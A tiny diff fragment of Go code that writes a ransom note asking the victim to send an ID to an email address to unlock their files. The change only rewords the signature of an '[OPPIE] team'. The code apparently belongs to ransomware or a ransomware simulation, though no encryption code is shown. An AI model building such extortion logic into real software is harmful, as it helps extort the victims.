@@ -42,7 +42,7 @@ If you need to unlock your files please send your ID to some@email.com with an o
 
 ID: 1234
 
-Best regards, [OPPIE] team.`
+Best regards, the [OPPIE] team.`
 
 	if _, err := file.Write([]byte(message)); err != nil {
 		return err
